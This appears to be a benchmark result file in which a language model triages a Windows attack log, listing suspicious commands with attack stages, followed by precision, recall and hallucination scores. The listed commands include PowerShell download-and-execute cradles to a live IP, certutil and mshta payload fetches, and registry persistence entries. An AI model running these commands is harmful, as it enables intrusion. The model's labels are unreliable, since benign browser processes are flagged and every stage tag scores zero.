@@ -1,0 +1,255 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Windows\\System32\\Notepad.exe D:\\Log\\apt-new.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\System32\\DLLHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=1996 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:8 ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=audio.mojom.AudioService --lang=zh-CN --service-sandbox-type=audio --mojo-platform-channel-handle=5344 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:8",
+        "stage": "Collection"
+      },
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=zh-CN --service-sandbox-type=service --mojo-platform-channel-handle=6732 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:8",
+        "stage": "Collection"
+      },
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=edge_collections.mojom.CollectionsDataManager --lang=zh-CN --service-sandbox-type=collections --mojo-platform-channel-handle=3028 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:8",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\temp\tool.exe' 'c:\tools\tool.exe'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \"HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\policies\\explorer\\run\" /v \"tool\" /t REG_SZ /d \"c:\\tools\\tool.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C 'Copy-Item -Path ./temp/tool.exe -Destination c:\\tools\\tool.exe'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\verifierdlls\" /v \"1\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\verifierdlls\" /v \"1\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest http://124.223.85.207:8082/test.hta -method post-usebasicparsing-contenttype application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C {cscript C:\\atomicredteam\\atomics\\T1220\\bin\\msxsl.exe c:\\atomicredteam\\atomics\\T1220\\src\\msxslxmlfile.xml c:\\atomicredteam\\atomics\\T1220\\src\\msxslscript.xsl}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c \"echo [InternetShortcut]\\r\\nURL=http://www.example.com\\/checksum.exe>>\\path\\to\\checksum.exe\"",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attacker gained initial access using various methods such as PowerShell commands to download scripts from a remote server, certutil.exe to download files, and mshta.exe to execute HTAs. The attacker also used various tools like Mimikatz, NLTEST, Procdump, and VSSAdmin. The attacker created scheduled tasks, ran arbitrary scripts, deleted registry keys, added new registry entries, created folders, modified file timestamps, and more.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44299,
+      "completion_tokens": 2764,
+      "total_tokens": 47063,
+      "wall_clock_s": 47.543,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6666666666666666,
+      "recall": 0.4927536231884058,
+      "f1": 0.5666666666666667,
+      "tp": 34,
+      "fp": 17,
+      "fn": 35
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 51,
+      "fn": 37,
+      "recall_partial": 0.02702702702702703
+    },
+    "hallucination_rate": 0.32,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 44299,
+      "completion_tokens": 2764,
+      "total_tokens": 47063,
+      "wall_clock_s": 47.543,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
